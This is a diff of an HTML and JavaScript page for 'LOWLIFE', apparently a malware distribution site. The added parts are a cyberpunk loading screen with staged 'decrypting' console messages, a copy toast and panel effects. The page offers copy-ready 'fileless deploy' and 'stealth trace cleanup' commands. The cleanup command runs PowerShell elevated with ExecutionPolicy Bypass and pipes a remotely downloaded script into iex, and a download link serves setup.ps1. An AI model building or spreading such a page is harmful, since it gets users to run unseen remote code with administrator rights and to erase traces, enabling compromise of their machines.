@@ -7,11 +7,45 @@
     <link rel="stylesheet" href="style.css?v=2">
 </head>
 <body>
+    <!-- Background Effects -->
+    <div class="bg-grid"></div>
+    <div class="bg-radial"></div>
+    <div class="bg-blob-1"></div>
+    <div class="bg-blob-2"></div>
+
+    <!-- Cyberpunk Loader Overlay -->
+    <div id="loader-overlay">
+        <div class="loader-content">
+            <div class="loader-ring">
+                <svg class="loader-ring-svg" viewBox="0 0 120 120">
+                    <defs>
+                        <linearGradient id="loader-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#00f2fe" />
+                            <stop offset="100%" stop-color="#6366f1" />
+                        </linearGradient>
+                    </defs>
+                    <circle class="loader-ring-bg" cx="60" cy="60" r="54" />
+                    <circle class="loader-ring-progress" id="loader-progress" cx="60" cy="60" r="54" />
+                </svg>
+                <div class="loader-percentage" id="loader-percentage">0%</div>
+            </div>
+            <h2 class="loader-title">LOWLIFE</h2>
+            <p class="loader-subtitle">Secure Telemetry Sync</p>
+            <div class="loader-console" id="loader-console"></div>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="copied-toast" id="copied-toast">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+        <span>Command Copied to Clipboard</span>
+    </div>
+
     <div class="container">
         <div class="header">
             <div class="status-badge">
                 <span class="status-dot"></span>
-                System Node: Online
+                System Node: Active
             </div>
             <h1 class="logo-title">LOWLIFE</h1>
             <div class="subtitle">Secure Distribution Hub</div>
@@ -20,7 +54,7 @@
         <div class="panel">
             <div class="panel-title">
                 <span class="panel-title-icon">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="9" x2="15" y2="9"></line><line x1="9" y1="13" x2="15" y2="13"></line><line x1="9" y1="17" x2="11" y2="17"></line></svg>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="9" x2="15" y2="9"></line><line x1="9" y1="13" x2="15" y2="13"></line><line x1="9" y1="17" x2="11" y2="17"></line></svg>
                 </span>
                 Active Telemetry & Release Logs
             </div>
@@ -38,21 +72,21 @@
 
             <div class="input-group">
                 <label>Release Timestamp</label>
-                <div class="text-input" id="lbl-date" style="display: flex; align-items: center; background: rgba(0,0,0,0.25);" readonly>-</div>
+                <div class="text-input" id="lbl-date" style="display: flex; align-items: center; background: rgba(5, 7, 15, 0.5);" readonly>-</div>
             </div>
 
             <div class="input-group" style="margin-bottom: 5px;">
                 <label>Changelog Details</label>
                 <div class="changelog-box" id="lbl-changelog">
-                    Loading update logs...
+                    Initialising update logs...
                 </div>
             </div>
         </div>
 
-        <div class="panel" style="margin-bottom: 20px;">
+        <div class="panel">
             <div class="panel-title">
                 <span class="panel-title-icon">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
                 </span>
                 Fileless Deploy Command
             </div>
@@ -66,15 +100,15 @@
             </div>
         </div>
 
-        <div class="panel" style="margin-bottom: 25px;">
-            <div class="panel-title">
-                <span class="panel-title-icon" style="color: var(--accent-rose);">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+        <div class="panel" style="margin-bottom: 30px;">
+            <div class="panel-title" style="color: var(--neon-rose);">
+                <span class="panel-title-icon" style="background: rgba(244, 63, 94, 0.08); border-color: rgba(244, 63, 94, 0.2); color: var(--neon-rose); box-shadow: var(--shadow-neon-rose);">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
                 </span>
                 Stealth Trace Cleanup Command
             </div>
             <label>Run this command once in PowerShell (as Administrator) to wipe traces:</label>
-            <div class="command-block" style="border-color: rgba(244, 63, 94, 0.25);">
+            <div class="command-block" style="border-color: rgba(244, 63, 94, 0.15);">
                 <input type="text" id="cleanup-cmd" class="text-input" readonly value="powershell -ExecutionPolicy Bypass -Command &quot;Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command &amp; { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString(''__HOST_URL__/cleanup'') }' -Verb RunAs&quot;">
                 <button id="btn-copy-cleanup" class="btn-inline-copy">
                     <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
@@ -83,7 +117,7 @@
             </div>
         </div>
 
-        <a href="/download" class="btn btn-primary" id="btn-download" style="text-decoration: none; margin-bottom: 10px;">
+        <a href="/download" class="btn btn-primary" id="btn-download" style="text-decoration: none;">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
             Download Setup Script (setup.ps1)
         </a>
@@ -99,6 +133,7 @@
         const btnCopy = document.getElementById('btn-copy');
         const cleanupCmd = document.getElementById('cleanup-cmd');
         const btnCopyCleanup = document.getElementById('btn-copy-cleanup');
+        const toast = document.getElementById('copied-toast');
 
         // Determine whether we are hosted statically on GitHub Pages or locally
         const isGitHubPages = window.location.hostname.endsWith('github.io') || window.location.pathname.includes('/lowlife');
@@ -124,6 +159,15 @@
         powershellCmd.value = powershellCmd.value.replace('__HOST_URL__/setup.ps1', setupUrl);
         cleanupCmd.value = cleanupCmd.value.replace('__HOST_URL__/cleanup', cleanupUrl);
 
+        // Toast Trigger Function
+        function showToast(text) {
+            toast.querySelector('span').textContent = text;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
         // Copy button handler (Installation)
         btnCopy.addEventListener('click', () => {
             powershellCmd.select();
@@ -132,6 +176,7 @@
             
             btnCopy.classList.add('copied');
             btnCopy.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied`;
+            showToast("Deploy Command Copied to Clipboard");
             setTimeout(() => {
                 btnCopy.classList.remove('copied');
                 btnCopy.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy`;
@@ -146,11 +191,43 @@
             
             btnCopyCleanup.classList.add('copied');
             btnCopyCleanup.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied`;
+            showToast("Cleanup Command Copied to Clipboard");
             setTimeout(() => {
                 btnCopyCleanup.classList.remove('copied');
-                btnCopyCleanup.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy`;
+                btnCopyCleanup.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2 2v1"></path></svg> Copy`;
             }, 2000);
         });
+
+        // Mouse Parallax Glow effect on panels
+        document.querySelectorAll('.panel').forEach(panel => {
+            panel.addEventListener('mousemove', e => {
+                const rect = panel.getBoundingClientRect();
+                const x = e.clientX - rect.left;
+                const y = e.clientY - rect.top;
+                panel.style.setProperty('--mouse-x', `${x}px`);
+                panel.style.setProperty('--mouse-y', `${y}px`);
+            });
+        });
+
+        // Diagnostic Loader sequence and API loading
+        const loaderConsole = document.getElementById('loader-console');
+        const loaderProgress = document.getElementById('loader-progress');
+        const loaderPercentage = document.getElementById('loader-percentage');
+        const loaderOverlay = document.getElementById('loader-overlay');
+
+        const diagMessages = [
+            { text: "STATION CONNECTION REQUEST...", type: "system" },
+            { text: "ESTABLISHING HANDSHAKE WITH PORT 443...", type: "system" },
+            { text: "ACCESSING LOWLIFE NODE GATEWAY...", type: "system" },
+            { text: "ENCRYPTED SESSION SYNCING...", type: "success" },
+            { text: "FETCHING REMOTE TELEMETRY LOGS...", type: "system" },
+            { text: "DECRYPTING DATABASE RECORDS...", type: "system" },
+            { text: "HASHING METADATA INTEGRITY...", type: "success" },
+            { text: "INTERFACE CONFIGURATION COMPLETED.", type: "success" }
+        ];
+
+        let releaseDataLoaded = false;
+        let releaseError = null;
 
         async function fetchLatestRelease() {
             try {
@@ -179,10 +256,71 @@
                 } else {
                     lblChangelog.textContent = 'Failed to load details from the active update node.';
                 }
+                releaseDataLoaded = true;
             } catch (err) {
                 lblChangelog.textContent = 'Failed to connect to the distribution service.';
+                releaseError = err;
+                releaseDataLoaded = true;
             }
         }
+
+        // Start fetching data in the background immediately
+        fetchLatestRelease();
+
+        // Run the animated loading sequence
+        let progress = 0;
+        let logIndex = 0;
+        const totalSteps = diagMessages.length;
+
+        function updateProgressCircle(pct) {
+            const radius = 54;
+            const circumference = 2 * Math.PI * radius; // 339.29
+            const offset = circumference - (pct / 100) * circumference;
+            loaderProgress.style.strokeDashoffset = offset;
+            loaderPercentage.textContent = `${Math.floor(pct)}%`;
+        }
+
+        function appendConsoleLine(messageObj) {
+            const line = document.createElement('div');
+            line.className = 'loader-log-line';
+            if (messageObj.type) line.classList.add(messageObj.type);
+            line.textContent = `> ${messageObj.text}`;
+            loaderConsole.appendChild(line);
+            loaderConsole.scrollTop = loaderConsole.scrollHeight;
+        }
+
+        function runLoader() {
+            const interval = setInterval(() => {
+                // Increment loader progress
+                progress += (100 / totalSteps) / 4; // micro-increments
+
+                // Sync printing log messages
+                const currentMsgIndex = Math.floor((progress / 100) * totalSteps);
+                if (logIndex < currentMsgIndex && logIndex < totalSteps) {
+                    appendConsoleLine(diagMessages[logIndex]);
+                    logIndex++;
+                }
+
+                if (progress >= 100) {
+                    progress = 100;
+                    updateProgressCircle(progress);
+                    clearInterval(interval);
+
+                    // Wait slightly for smooth transition
+                    setTimeout(() => {
+                        loaderOverlay.style.opacity = 0;
+                        setTimeout(() => {
+                            loaderOverlay.style.visibility = 'hidden';
+                        }, 800);
+                    }, 500);
+                } else {
+                    updateProgressCircle(progress);
+                }
+            }, 60);
+        }
+
+        // Initialize loading screen sequence
+        runLoader();
 
         // Increase download counter visually on click to feel instant
         btnDownload.addEventListener('click', () => {
@@ -193,8 +331,6 @@
                 }
             }, 300);
         });
-
-        fetchLatestRelease();
     </script>
 </body>
 </html>
